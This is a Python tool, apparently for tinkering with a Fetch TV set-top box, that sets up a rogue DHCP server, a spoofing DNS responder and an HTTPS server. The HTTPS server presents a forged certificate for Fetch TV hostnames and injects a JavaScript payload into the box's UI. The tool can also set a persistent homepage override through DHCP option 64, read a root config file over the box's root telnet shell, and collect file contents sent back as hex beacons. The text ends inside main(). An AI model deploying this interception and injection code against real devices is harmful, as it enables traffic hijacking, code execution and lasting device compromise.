#!/usr/bin/env python3
"""
fetch_inject.py -  DNS / DHCP / HTTPS harness for the set-top-box.

All activity is logged in arrival order as JSONL.

Requires admin/root for UDP/53, UDP/67, TCP/443 (and TCP/80 with --plain-http).
Python 3.8+. Standard library only for the core; 'cryptography' is optional
and enables on-demand per-SNI certificate generation.

Dry run is the default: with no --payload nothing is served and the run is log-only. 

Examples assume 192.168.50.1 is the IP of this host's interface 

There is code in here used during development. It's all pretty readable but not pretty nice.


HTTP[S] INJECT:--------------------------------------------------------------------------------
Use a dedicated Ethernet segment between this host and the set top box. ie: Plug the box into this host.
DNS queries will all be answered with the --host-ip

Example 1 (log-only discovery):
    sudo python3 fetch_inject.py --iface 192.168.50.1 --host-ip 192.168.50.1 --dhcp-range 192.168.50.2-192.168.50.20 --log events.jsonl

Example 2 (inject) (Read the payload comments please):
HTTPS (optionally HTTP) requests that match the pattern defined by --payload-route will be served the --payload file. Only for two specific servers though.
You may need to adjust the server list. Read the logs this produces and work it out.
    sudo python3 fetch_inject.py --iface 192.168.50.1 --host-ip 192.168.50.1 --dhcp-range 192.168.50.2-192.168.50.20 --payload-route '*sui_redirect*' --payload payload_persist.js --log events.jsonl

DHCP INJECT:-----------------------------------------------------------------------------------
Needs to be on same layer2 segment as the box. This can change the URL called for the UI.

DANGER
DHCP Option 64 will set the homepage_url option on the box and it survives reboots.
This can break your box unless you know how to recover it.

Example 3 (read current /root/yx_config_user.ini values so you know how to fix if you break it):
    sudo python3 fetch_inject.py --host-ip 192.168.50.1 --show-homepage --via-page  --save orig_homepage.conf --log events.jsonl

Example 4 (set homepage back to original, according to the test box. Yours might be different. CAUTION):
    sudo python3 fetch_inject.py --host-ip 192.168.50.1 --dhcp-option 64='file:///home/fetchtv/sui/internet_test_redirect.html' --log events.jsonl

"""

import argparse
import asyncio
import ipaddress
import json
import os
import re
import socket
import ssl
import struct
import sys
import time
import urllib.parse
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler
from pathlib import Path


# ---------------------------------------------------------------------------
# Event log: single writer, arrival order = call order into log().
# ---------------------------------------------------------------------------
class EventLog:
    def __init__(self, path=None):
        self.path = path
        self.seq = 0
        self.stream = None
        if path:
            self.stream = open(path, "a", encoding="utf-8")

    def log(self, kind, **fields):
        self.seq += 1
        rec = {
            "seq": self.seq,
            "t_mono_ns": time.monotonic_ns(),
            "t_utc": datetime.now(timezone.utc).isoformat(),
            "kind": kind,
        }
        rec.update(fields)
        line = json.dumps(rec, separators=(",", ":"))
        print(line, flush=True)
        if self.stream:
            self.stream.write(line + "\n")
            self.stream.flush()

    def close(self):
        if self.stream:
            self.stream.close()


# ---------------------------------------------------------------------------
# DNS: minimal A responder. Copies the question section verbatim and appends
# one A record. Everything else is NOERROR/NODATA.
# ---------------------------------------------------------------------------
class DNSProtocol(asyncio.DatagramProtocol):
    def __init__(self, events, answer_ip, allow_src):
        self.events = events
        self.answer_bytes = ipaddress.IPv4Address(answer_ip).packed
        self.allow_src = allow_src
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport

    @staticmethod
    def _read_name(data, offset):
        labels = []
        seen = set()
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if length & 0xC0 == 0xC0:
                if offset + 1 >= len(data):
                    return None, None
                pointer = ((length & 0x3F) << 8) | data[offset + 1]
                if pointer in seen or pointer >= offset:
                    return None, None
                seen.add(pointer)
                name, _ = DNSProtocol._read_name(data, pointer)
                return (".".join(labels + [name]) if name else ".".join(labels)), offset + 2
            if length > 63 or offset + 1 + length > len(data):
                return None, None
            labels.append(data[offset + 1:offset + 1 + length].decode("ascii", "replace"))
            offset += 1 + length
        return ".".join(labels), offset

    def datagram_received(self, data, addr):
        client_ip = addr[0]
        if self.allow_src and client_ip not in self.allow_src:
            return
        if len(data) < 12:
            return
        txid = data[0:2]
        flags = struct.unpack("!H", data[2:4])[0]
        qdcount = struct.unpack("!H", data[4:6])[0]
        if qdcount < 1:
            return
        qname, qend = self._read_name(data, 12)
        if qend is None or qend + 4 > len(data):
            return
        qtype, qclass = struct.unpack("!HH", data[qend:qend + 4])
        self.events.log("dns", client_ip=client_ip, qname=qname,
                        qtype=qtype, qclass=qclass)

        question = data[12:qend + 4]
        qr = 0x8000
        rd = flags & 0x0100
        ra = 0x0080
        answer = b""
        ancount = 0
        if qtype == 1 and qclass == 1:  # A / IN
            answer = (b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4)
                      + self.answer_bytes)
            ancount = 1
        # DNS header: ID + 5 x 16-bit fields (flags, QD, AN, NS, AR).
        response = (txid + struct.pack("!HHHHH", qr | rd | ra, qdcount,
                                       ancount, 0, 0) + question + answer)
        try:
            self.transport.sendto(response, addr)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# DHCP: enough of a server for one test unit. No lease database, no renewal
# state - intentionally minimal. Binds 0.0.0.0:67 with SO_REUSEADDR and
# sends the offer/ack to the subnet-directed broadcast on port 68.
# ---------------------------------------------------------------------------
class DHCPProtocol(asyncio.DatagramProtocol):
    MAGIC = b"\x63\x82\x53\x63"

    def __init__(self, events, server_ip, pool_start, pool_end, netmask,
                 lease_seconds=86400, extra_options=None):
        self.events = events
        # Caller-supplied DHCP options, appended to every OFFER/ACK.
        # Each item is (code:int, value:bytes).
        self.extra_options = list(extra_options or [])
        self.server_ip = ipaddress.IPv4Address(server_ip).packed
        self.mask = ipaddress.IPv4Address(netmask).packed
        self.pool_start = ipaddress.IPv4Address(pool_start)
        self.pool_end = ipaddress.IPv4Address(pool_end)
        self.net = ipaddress.IPv4Network(
            f"{server_ip}/{netmask}", strict=False)
        self.broadcast = str(self.net.broadcast_address)
        self.lease = struct.pack("!I", lease_seconds)
        self.transport = None
        self.leases = {}

    def connection_made(self, transport):
        self.transport = transport

    def _options(self, raw):
        out = {}
        i = 0
        while i < len(raw):
            code = raw[i]
            if code == 0:      # pad
                i += 1
                continue
            if code == 255:    # end
                break
            if i + 2 > len(raw):
                break
            length = raw[i + 1]
            out[code] = raw[i + 2:i + 2 + length]
            i += 2 + length
        return out

    @staticmethod
    def _encode_options(opts):
        body = bytearray()
        for code, value in opts:
            body += bytes([code, len(value)]) + value
        body += b"\xff"
        return bytes(body)

    def _ip_for(self, mac):
        if mac in self.leases:
            return self.leases[mac]
        used = set(self.leases.values())
        ip_int = int(self.pool_start)
        end = int(self.pool_end)
        while ip_int <= end:
            cand = ipaddress.IPv4Address(ip_int)
            if cand not in used:
                self.leases[mac] = cand
                return cand
            ip_int += 1
        return ipaddress.IPv4Address(int(self.pool_start))

    def datagram_received(self, data, addr):
        if len(data) < 240 or data[:4] != b"\x01\x01\x06\x00":
            return
        xid = data[4:8]
        mac = data[28:34]
        mac_s = ":".join(f"{b:02x}" for b in mac)
        opts = self._options(data[240:])
        msgtype = opts.get(53, b"\x00")[0]
        self.events.log("dhcp", client_ip=addr[0], mac=mac_s,
                        msgtype=msgtype,
                        vendor_class=opts.get(60, b"").decode("ascii", "replace"))

        if msgtype not in (1, 3):  # DISCOVER, REQUEST
            return
        ip = self._ip_for(mac)
        reply_opts = [
            (53, b"\x02" if msgtype == 1 else b"\x05"),  # OFFER / ACK
            (54, self.server_ip),                         # server id
            (1, self.mask),                               # subnet mask
            (3, self.server_ip),                          # router
            (6, self.server_ip),                          # DNS = host
            (51, self.lease),
        ]
        reply_opts.extend(self.extra_options)
        # BOOTP header is 236 bytes, then the 4-byte magic cookie at 240.
        # Offsets: ciaddr 12..16, yiaddr 16..20, siaddr 20..24,
        # giaddr 24..28, chaddr 28..44, sname 44..108, file 108..236.
        reply = (
            b"\x02\x01\x06\x00"        # op=BOOTREPLY, htype=1, hlen=6, hops=0
            + xid                      # 4..8
            + b"\x00\x00"              # secs 8..10
            + b"\x00\x00"              # flags 10..12
            + b"\x00\x00\x00\x00"      # ciaddr 12..16
            + ip.packed                # yiaddr 16..20  <-- offered IP
            + self.server_ip           # siaddr 20..24
            + b"\x00\x00\x00\x00"      # giaddr 24..28
            + mac[:6] + b"\x00" * 10   # chaddr 28..44
            + b"\x00" * 64             # sname 44..108
            + b"\x00" * 128            # file 108..236
            + self.MAGIC               # 236..240
            + self._encode_options(reply_opts)
        )
        # Use the subnet-directed broadcast so the kernel routes the reply out
        # the interface that owns --host-ip, not whatever the default route is.
        self.events.log("dhcp_reply", mac=mac_s,
                        msgtype=reply_opts[0][1][0], offered_ip=str(ip),
                        dest=self.broadcast)
        try:
            self.transport.sendto(reply, (self.broadcast, 68))
        except OSError as exc:
            self.events.log("dhcp_send_error", mac=mac_s, error=str(exc))


# ---------------------------------------------------------------------------
# HTTPS: ThreadingHTTPServer is avoided so one asyncio loop owns all logging.
# A tiny HTTP/1.1 parser handles GET requests and logs them before replying.
# ---------------------------------------------------------------------------
async def handle_client(reader, writer, events, opts, sni_state):
    peername = writer.get_extra_info("peername")
    client_ip = peername[0] if peername else "?"
    # asyncio.start_server(ssl=...) has already terminated TLS, so the
    # StreamReader/StreamWriter pair carries plaintext HTTP.
    sslobj = writer.get_extra_info("ssl_object")
    sni = (getattr(sslobj, "server_name", "") or ""
           if sslobj else "") or sni_state.get("sni", "")

    try:
        line = await asyncio.wait_for(reader.readline(), timeout=10)
        if not line:
            return
        parts = line.decode("iso-8859-1").strip().split()
        if len(parts) < 2:
            return
        method, path = parts[0], parts[1]
        headers = {}
        while True:
            h = await asyncio.wait_for(reader.readline(), timeout=5)
            if not h or h in (b"\r\n", b"\n"):
                break
            if b":" in h:
                k, v = h.decode("iso-8859-1").split(":", 1)
                headers[k.strip().lower()] = v.strip()
        events.log("https", client_ip=client_ip, sni=sni,
                   method=method, path=path,
                   user_agent=headers.get("user-agent", ""))

        status = "204 No Content"
        body = b""
        ctype = "text/plain"
        if method == "GET":
            if path == "/payload.js" and opts.payload_path:
                body = opts.payload_path.read_bytes()
                ctype = "application/javascript"
                status = "200 OK"
            elif path.startswith("/log"):
                q = path.split("?", 1)[1] if "?" in path else ""
                events.log("beacon", client_ip=client_ip, query=q)
                if getattr(opts, "collector", None) is not None:
                    opts.collector.feed(q, events)
                if getattr(opts, "probe_event", None) is not None:
                    if "k=probe" in q and "stage=verdict" in q:
                        qs = urllib.parse.parse_qs(q)
                        opts.probe_verdict = urllib.parse.unquote(
                            qs.get("v", [""])[0])
                        opts.probe_event.set()
                body = b"ok"
                status = "200 OK"
            elif (opts.payload_route and
                  fnmatch_path(path, opts.payload_route)):
                route = opts.payload_route
                if opts.inline and opts.payload_path:
                    js = opts.payload_path.read_text(encoding="utf-8",
                                                     errors="replace")
                    body = ("<!doctype html><html><head><meta charset='utf-8'>"
                            "<title>bridge test</title></head><body><script>"
                            + js + "</script></body></html>").encode("utf-8")
                else:
                    body = ("<!doctype html><html><head><meta charset='utf-8'>"
                            "<title>bridge test</title></head><body>"
                            "<script src='/payload.js'></script>"
                            "</body></html>").encode("utf-8") if route else b""
                ctype = "text/html"
                status = "200 OK"
        head = (f"HTTP/1.1 {status}\r\n"
                f"Content-Type: {ctype}\r\n"
                f"Content-Length: {len(body)}\r\n"
                "Connection: close\r\n\r\n").encode("ascii")
        writer.write(head + body)
        await writer.drain()
    except Exception as exc:
        events.log("https_error", client_ip=client_ip, error=str(exc))
    finally:
        try:
            writer.close()
        except Exception:
            pass


def fnmatch_path(path, pattern):
    # Treat * as a leading/trailing wildcard; no regex needed.
    if pattern.startswith("*") and pattern.endswith("*"):
        return pattern[1:-1] in path
    if pattern.startswith("*"):
        return path.endswith(pattern[1:])
    if pattern.endswith("*"):
        return path.startswith(pattern[:-1])
    return path == pattern


def make_ssl_context(opts, events, sni_state):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    if opts.cert and opts.key:
        ctx.load_cert_chain(opts.cert, opts.key)
    else:
        cert, key = generate_cert(opts, events)
        ctx.load_cert_chain(cert, key)

    def on_sni(sslsock, server_name, sslctx):
        sni_state["sni"] = server_name or ""
        events.log("tls_sni", sni=sni_state["sni"])

    ctx.set_servername_callback(on_sni)
    return ctx


def generate_cert(opts, events):
    cert_dir = Path(opts.cert_dir)
    cert_dir.mkdir(parents=True, exist_ok=True)
    cert = cert_dir / "cert.pem"
    key = cert_dir / "key.pem"
    if cert.exists() and key.exists():
        return str(cert), str(key)
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
        import datetime as dt
        k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,
                                             "mw.fetchtv.com.au")])
        san = x509.SubjectAlternativeName([
            x509.DNSName("mw.fetchtv.com.au"),
            x509.DNSName("apis.fetchtv.com.au"),
        ])
        now = dt.datetime.utcnow()
        c = (x509.CertificateBuilder()
             .subject_name(name).issuer_name(name)
             .public_key(k.public_key())
             .serial_number(x509.random_serial_number())
             .not_valid_before(now - dt.timedelta(days=1))
             .not_valid_after(now + dt.timedelta(days=30))
             .add_extension(san, critical=False)
             .sign(k, hashes.SHA256()))
        key.write_bytes(k.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()))
        cert.write_bytes(c.public_bytes(serialization.Encoding.PEM))
        events.log("cert_generated", path=str(cert), method="cryptography")
        return str(cert), str(key)
    except ImportError:
        pass
    # Fallback to openssl CLI if available.
    import subprocess
    cmd = ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
           "-days", "30", "-keyout", str(key), "-out", str(cert),
           "-subj", "/CN=mw.fetchtv.com.au",
           "-addext", "subjectAltName=DNS:mw.fetchtv.com.au,DNS:apis.fetchtv.com.au"]
    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)
    events.log("cert_generated", path=str(cert), method="openssl")
    return str(cert), str(key)


async def run(args):
    events = EventLog(args.log)
    try:
        events.log("injection", dry_run=bool(args.dry_run),
                   payload=str(args.payload_path) if args.payload_path else None,
                   route=args.payload_route)
        sni_state = {}
        sslctx = make_ssl_context(args, events, sni_state)
        loop = asyncio.get_running_loop()

        reuse = sys.platform != "win32"

        if args.static_only:
            events.log("mode", dhcp=False, static_ip=args.host_ip)
        else:
            extra = []
            for spec in (args.dhcp_option or []):
                if "=" not in spec:
                    raise SystemExit("--dhcp-option needs CODE=VALUE")
                code_s, val = spec.split("=", 1)
                extra.append((int(code_s, 0), val.encode("utf-8")))
            if extra:
                events.log("dhcp_extra_options",
                           options=[c for c, _ in extra])
            transport, _ = await loop.create_datagram_endpoint(
                lambda: DHCPProtocol(events, args.host_ip,
                                     args.dhcp_start, args.dhcp_end,
                                     args.netmask,
                                     extra_options=extra),
                local_addr=("0.0.0.0", 67), reuse_port=reuse)
            sock = transport.get_extra_info("socket")
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            # On Linux, pin sends to the named interface if --iface is a real
            # interface name. If it is an IP, skip; the directed broadcast
            # already forces the right route.
            if sys.platform.startswith("linux") and args.iface:
                names = {name for _, name in socket.if_nameindex()}
                if args.iface in names:
                    sock.setsockopt(socket.SOL_SOCKET,
                                    getattr(socket, "SO_BINDTODEVICE", 25),
                                    args.iface.encode())
                    events.log("iface_bound", iface=args.iface)
            events.log("mode", dhcp=True, host_ip=args.host_ip,
                       broadcast=str(ipaddress.IPv4Network(
                           f"{args.host_ip}/{args.netmask}",
                           strict=False).broadcast_address))

        transport, _ = await loop.create_datagram_endpoint(
            lambda: DNSProtocol(events, args.dns_answer, args.allow_src),
            local_addr=("0.0.0.0", 53), reuse_port=reuse)

        server = await asyncio.start_server(
            lambda r, w: handle_client(r, w, events, args, sni_state),
            host="0.0.0.0", port=443, ssl=sslctx)

        # Plain HTTP origin, for DHCP-injected homepage URLs (which are http://
        # and would otherwise fail with connection refused on port 80).
        plain = None
        if args.plain_http:
            plain = await asyncio.start_server(
                lambda r, w: handle_client(r, w, events, args, sni_state),
                host="0.0.0.0", port=args.http_port)
            events.log("plain_http", port=args.http_port)

        events.log("ready", dns="0.0.0.0:53", https="0.0.0.0:443",
                   dry_run=args.dry_run)
        if getattr(args, "collector", None) is not None and args.show_homepage:
            asyncio.create_task(report_page_ini(args, events, server, plain))
        if getattr(args, "probe_mode", False):
            args.probe_event = asyncio.Event()
            asyncio.create_task(watch_probe(args, events, server, plain))
        async with server:
            if plain:
                async with plain:
                    try:
                        await server.serve_forever()
                    except asyncio.CancelledError:
                        # Our own report/page tasks close the server; that cancels
                        # serve_forever, which is a normal stop, not an error.
                        if not getattr(args, "stopping", False):
                            raise
            else:
                try:
                    await server.serve_forever()
                except asyncio.CancelledError:
                    if not getattr(args, "stopping", False):
                        raise
    finally:
        events.close()


# ---------------------------------------------------------------------------
# --show-homepage: report the homepage_url the boot path will actually use.
#
# Deliberately does NOT go through the injected page: a bad homepage_url is the
# exact failure this has to recover from, so it must not depend on the SUI
# loading. The nxserver wrapper starts telnetd before it execs the real app, so
# that shell is available even when the UI is dead. --ini covers the offline
# case (a copy from a dumped image).
# ---------------------------------------------------------------------------
INI_PATH = "/root/yx_config_user.ini"
READ_PAYLOAD = Path(__file__).resolve().with_name("payload_readini.js")
PROBE_PAYLOAD = Path(__file__).resolve().with_name("payload_probe.js")


def strip_telnet_ctrl(data):
    """Remove IAC sequences so the shell text can be read as plain text."""
    out = bytearray()
    i = 0
    n = len(data)
    while i < n:
        byte = data[i]
        if byte != 0xFF:
            out.append(byte)
            i += 1
            continue
        if i + 1 >= n:
            break
        cmd = data[i + 1]
        if cmd >= 0xFB:            # WILL / WONT / DO / DONT + option
            i += 3
        elif cmd == 0xFA:          # SB ... IAC SE
            j = data.find(b"\xff\xf0", i + 2)
            i = n if j < 0 else j + 2
        else:                      # two-byte IAC command
            i += 2
    return bytes(out)


def _marker_line_seen(text, marker):
    """True once the marker arrives as its own line (its output, not the echo).

    The shell echoes the whole command first, so 'marker in text' is true far
    too early - cut on a bare marker line instead.
    """
    return any(line.strip() == marker for line in text.split("\n"))


def read_via_telnet(ip, port, path=INI_PATH, timeout=8.0):
    """Cat the ini over the box's root telnet shell and return (text, raw)."""
    marker = "XXXXXX_EOF_%d" % int(time.time() * 1000 % 1000000)
    sock = socket.create_connection((ip, port), timeout=5)
    sock.settimeout(timeout)
    raw = b""
    try:
        try:
            sock.recv(4096)        # banner / prompt
        except socket.timeout:
            pass
        cmd = "cat %s; echo %s" % (path, marker) + chr(13) + chr(10)
        sock.sendall(cmd.encode())
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            raw += chunk
            if _marker_line_seen(strip_telnet_ctrl(raw).decode("utf-8", "replace"),
                                 marker):
                break
            time.sleep(0.05)
    finally:
        sock.close()

    text = strip_telnet_ctrl(raw).decode("utf-8", "replace").replace(chr(13), "")
    lines = text.split("\n")
    # The shell echoes our own command, so the marker appears twice: once in the
    # echo, once in its output. Cut at the LAST one and drop the echoed command.
    stop = len(lines)
    for idx in range(len(lines) - 1, -1, -1):
        if lines[idx].strip() == marker:
            stop = idx
            break
    body = []
    for line in lines[:stop]:
        if marker in line or ("cat " + path) in line:
            continue
        body.append(line)
    while body and body[-1] == "":
        body.pop()                 # the final newline of `cat` output
    while body and body[0].strip() in ("", "#", "$", ">"):
        body.pop(0)                # a bare shell prompt left in the stream
    return "\n".join(body) + "\n", raw


def parse_ini(text):
    """key=value lines -> [(key, value, escaped_trailing_space)].

    The vendor writer escapes a trailing space as backslash-space, so the raw
    homepage_url line can end with a stray backslash.
    """
    entries = []
    for line in text.splitlines():
        if not line.strip() or line.lstrip().startswith(("#", ";")):
            continue
        if "=" not in line:
            entries.append((line.strip(), None, False))
            continue
        key, raw = line.split("=", 1)
        value = raw.rstrip()
        escaped = value.endswith("\\")
        if escaped:
            value = value[:-1]
        entries.append((key.strip(), value.strip(), escaped))
    return entries


def report_ini(text, source, args):
    """Print the summary. Shared by the console, --ini and injected-page readers."""

    entries = [(k, v, e) for (k, v, e) in parse_ini(text) if k]
    if not entries:
        print("read %d bytes from %s but found no key=value lines - wrong file?"
              % (len(text), source), file=sys.stderr)
        return 4

    print("# source: %s" % source)
    print("# read %d bytes, %d key=value lines"
          % (len(text), len([1 for k, v, e in entries if v is not None])))

    if args.save:
        try:
            Path(args.save).write_bytes(text.encode("utf-8"))
        except OSError as exc:
            print("cannot save to %s: %s" % (args.save, exc), file=sys.stderr)
        else:
            print("# saved copy: %s" % args.save)

    homes = [v for (k, v, e) in entries if k == "homepage_url"]
    if not homes:
        print("homepage_url= <absent from %s>" % source)
        return 5
    value, escaped = homes[0], [e for (k, v, e) in entries
                                if k == "homepage_url"][0]
    print("homepage_url=%s" % value)
    if escaped:
        print("# note: raw line ends with an escaped trailing space ('\\ ')")

    if args.full:
        print()
        print("# --- full file ---")
        for line in text.splitlines():
            print(line.rstrip())
    return 0


def show_homepage(args):
    """Console and local-file sources. --via-page is driven by run() (needs servers)."""
    if args.ini:
        try:
            blob = Path(args.ini).read_bytes()
        except OSError as exc:
            print("cannot read %s: %s" % (args.ini, exc), file=sys.stderr)
            return 2
        return report_ini(blob.decode("utf-8", "replace"), args.ini, args)

    try:
        text, _raw = read_via_telnet(args.box_ip, args.telnet_port,
                                     timeout=args.timeout)
    except OSError as exc:
        print("no answer from %s:%d (%s)" % (args.box_ip, args.telnet_port, exc),
              file=sys.stderr)
        print("box unreachable - use --via-page (no telnet needed) with the DNS or",
              file=sys.stderr)
        print("DHCP-option-64 redirect in place, or --ini <copy>, or the UART console",
              file=sys.stderr)
        return 3
    return report_ini(text, "%s:%s" % (args.box_ip, INI_PATH), args)


# ---------------------------------------------------------------------------
# Reading the same file through the injected page instead of a shell.
#
# The payload runs in the SUI's webview and reaches the same native bridge the
# launcher uses (new AVPlayer() -> Ag_textFile_open/read/close), so it is root
# equivalent without installing telnetd anywhere. The file comes back as hex
# chunks on the /log beacon endpoint this server already answers.
# ---------------------------------------------------------------------------
class IniCollector:
    def __init__(self):
        self.chunks = {}
        self.total = None
        self.error = None
        self.bytes = None
        self.done = asyncio.Event()

    def feed(self, query, events):
        qs = urllib.parse.parse_qs(query)

        def first(key, default=""):
            return qs.get(key, [default])[0]

        if first("k") != "ini":
            return
        stage = first("stage")
        if stage == "meta":
            try:
                self.total = int(first("n", "0"))
            except ValueError:
                self.total = None
            events.log("ini_meta", chunks=self.total, payload_bytes=first("bytes"))
            self._maybe_finish(events)
        elif stage == "chunk":
            try:
                idx = int(first("i", "-1"))
            except ValueError:
                return
            if self.total is None:
                # Every chunk repeats the count, so a lost/reordered meta beacon
                # must not strand the collector waiting forever.
                try:
                    self.total = int(first("n", "0")) or None
                except ValueError:
                    self.total = None
            self.chunks[idx] = first("d")
            events.log("ini_chunk", index=idx, hex_chars=len(first("d")))
            self._maybe_finish(events)
        elif stage == "done":
            self.bytes = first("bytes")
            self._maybe_finish(events)
        elif stage in ("copy", "copy_ok"):
            # The reader falls back to copying the file when the bridge refuses
            # the original path. Informational, not an error.
            events.log("ini_copy", stage=stage, cmd=first("cmd"))
        else:
            extra = first("e") or (("fd=" + first("fd")) if first("fd") else "")
            self.error = stage + (("=" + extra) if extra else "")
            events.log("ini_error", stage=stage, detail=extra)
            self.done.set()

    def _maybe_finish(self, events):
        if self.total and len(self.chunks) >= self.total:
            self._finish(events)

    def _finish(self, events):
        if self.done.is_set():
            return
        events.log("ini_complete", chunks=len(self.chunks),
                   reported_bytes=self.bytes)
        self.done.set()

    def text(self):
        out = []
        for i in range(len(self.chunks)):
            try:
                out.append(bytes.fromhex(self.chunks.get(i, "")).decode(
                    "utf-8", "replace"))
            except ValueError:
                out.append("")
        return "".join(out)


async def report_page_ini(args, events, server, plain):
    collector = args.collector
    try:
        await asyncio.wait_for(collector.done.wait(), timeout=args.page_timeout)
    except asyncio.TimeoutError:
        print("no beacon from the box within %.0fs" % args.page_timeout,
              file=sys.stderr)
        print("the box never ran the payload page: check that --payload-route matches",
              file=sys.stderr)
        print("the URL it actually requested (see the 'https'/'http' lines in the log)",
              file=sys.stderr)
        args.page_exit = 6
    else:
        if collector.error:
            print("payload reported: %s" % collector.error, file=sys.stderr)
            print("page loaded but the native bridge failed (AVPlayer missing or the",
                  file=sys.stderr)
            print("read call rejected) - nothing read. Re-run with --probe to see",
                  file=sys.stderr)
            print("which paths and calls the bridge actually accepts.", file=sys.stderr)
            args.page_exit = 7
        else:
            text = collector.text()
            source = "injected page on %s, %d bytes" % (args.host_ip, len(text))
            args.page_exit = report_ini(text, source, args)
    args.stopping = True
    server.close()
    if plain:
        plain.close()


async def watch_probe(args, events, server, plain):
    """Wait for the probe's verdict beacon, report, then shut down."""
    try:
        await asyncio.wait_for(args.probe_event.wait(), timeout=args.page_timeout)
    except asyncio.TimeoutError:
        print("probe: no verdict within %.0fs - read the k=probe lines above"
              % args.page_timeout, file=sys.stderr)
        args.page_exit = 6
    else:
        print("probe verdict: %s" % (args.probe_verdict or "(empty)"))
        if args.collector and args.collector.done.is_set() and not args.collector.error:
            args.page_exit = report_ini(
                args.collector.text(),
                "injected page on %s" % args.host_ip, args)
        else:
            args.page_exit = 0
    args.stopping = True
    server.close()
    if plain:
        plain.close()


def parse_range(text):
    a, b = text.split("-", 1)
    return a, b


class _DummyTransport:
    def __init__(self):
        self.sent = []

    def sendto(self, data, addr):
        self.sent.append((bytes(data), addr))


def main(argv=None):
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--iface", help="informational: interface name or IP (binding is 0.0.0.0)")
    p.add_argument("--host-ip", help="IP to hand out / answer with (required except with --show-homepage)")
    p.add_argument("--static-only", action="store_true", help="no DHCP; use existing network config")
    p.add_argument("--dhcp-range", default="192.168.50.2-192.168.50.20")
    p.add_argument("--dhcp-option", action="append", metavar="CODE=VALUE",
                   help="extra DHCP option to send, e.g. 64=http://192.168.50.1/x "
                        "(64=NIS+DOMAIN->homepage, 40=NISDOMAIN->upgrade URL, "
                        "42=NTPSERVERS). Repeatable.")
    p.add_argument("--netmask", default="255.255.255.0")
    p.add_argument("--dns-answer", help="fixed A answer (default: --host-ip)")
    p.add_argument("--allow-src", nargs="*", default=[], help="optional client IP allowlist")
    p.add_argument("--cert", help="static TLS certificate")
    p.add_argument("--key", help="static TLS private key")
    p.add_argument("--cert-dir", default=".mitm_cert", help="cache for generated certs")
    p.add_argument("--payload", type=Path, help="JS payload file to send")
    p.add_argument("--payload-route",
                   help="match reqeusted http[s] path served with the injected page (eg: *sui_redirect* )")
    p.add_argument("--log", help="JSONL event log path")
    p.add_argument("--plain-http", action="store_true",
                   help="also serve the payload over plain HTTP (for DHCP-injected http:// homepage URLs)")
    p.add_argument("--http-port", type=int, default=80,
                   help="plain HTTP port (default 80)")
    p.add_argument("--inline", action="store_true",
                   help="embed the payload script in the page instead of /payload.js (untested)")
    p.add_argument("--dry-run", action="store_true",
                   help="force log-only even when a payload is given (this is the "
                        "default: nothing is served unless --payload is named)")
    p.add_argument("--show-homepage", action="store_true",
                   help="read /root/yx_config_user.ini and print homepage_url; "
                        "needs no --host-ip and starts no listeners")
    p.add_argument("--via-page", action="store_true",
                   help="with --show-homepage: read the ini through the injected "
                        "page's native bridge instead of a telnet shell; serves "
                        "payload_readini.js and needs root for 53/67/443/80")
    p.add_argument("--page-timeout", type=float, default=90.0,
                   help="--via-page: seconds to wait for the box's beacon (default 90)")
    p.add_argument("--box-ip", default="192.168.50.2",
                   help="--show-homepage: box address for the telnet read "
                        "(default 192.168.50.2)")
    p.add_argument("--telnet-port", type=int, default=2323,
                   help="--show-homepage: box root shell port (default 2323)")
    p.add_argument("--ini", help="--show-homepage: read this local copy instead "
                                 "of the box (e.g. extract/roothome/yx_config_user.ini)")
    p.add_argument("--save", help="--show-homepage: also write the raw file here")
    p.add_argument("--full", action="store_true",
                   help="--show-homepage: print the whole ini, not just homepage_url")
    p.add_argument("--timeout", type=float, default=8.0,
                   help="--show-homepage: telnet read timeout in seconds (default 8)")
    p.add_argument("--probe", action="store_true",
                   help="serve payload_probe.js to diagnose why the native file "
                        "read fails (writes /tmp/test_probe.txt and copies the "
                        "ini to /tmp/ini_probe.txt via Ag_network_ping)")
    args = p.parse_args(argv)

    args.collector = None
    args.page_exit = None
    args.stopping = False
    args.probe_mode = bool(args.probe)
    args.probe_event = None
    args.probe_verdict = None

    if args.via_page and not args.show_homepage:
        p.error("--via-page needs --show-homepage")

    if args.show_homepage and not args.via_page:
        # Read-only: no DNS/DHCP/TLS listeners, so this is safe to run before
        # touching the homepage config, and again afterwards to confirm.
        sys.exit(show_homepage(args))

    if args.via_page:
        if args.ini:
            p.error("--ini and --via-page are different sources; pick one")
        # Serve the reader payload and report whatever the box sends back.
        args.show_homepage = True
        args.collector = IniCollector()
        if not args.payload:
            args.payload = READ_PAYLOAD
        if not args.payload_route:
            args.payload_route = "*sui_redirect*"
        args.plain_http = True

    if args.probe:
        args.collector = IniCollector()      # also catches k=ini if a read works
        if not args.payload:
            args.payload = PROBE_PAYLOAD
        if not args.payload_route:
            args.payload_route = "*sui_redirect*"
        args.plain_http = True

    if not args.host_ip:
        p.error("--host-ip is required unless --show-homepage/--probe is used")

    args.dns_answer = args.dns_answer or args.host_ip
    args.dhcp_start, args.dhcp_end = parse_range(args.dhcp_range)

    # Dry run is the default: nothing is served unless a payload is named.
    if args.payload is None or args.dry_run:
        if args.payload is None and not args.dry_run:
            print("no --payload given: dry run (logging only, nothing served)",
                  file=sys.stderr)
        args.dry_run = True
        args.payload_path = None
        args.payload_route = None
    else:
        args.dry_run = False
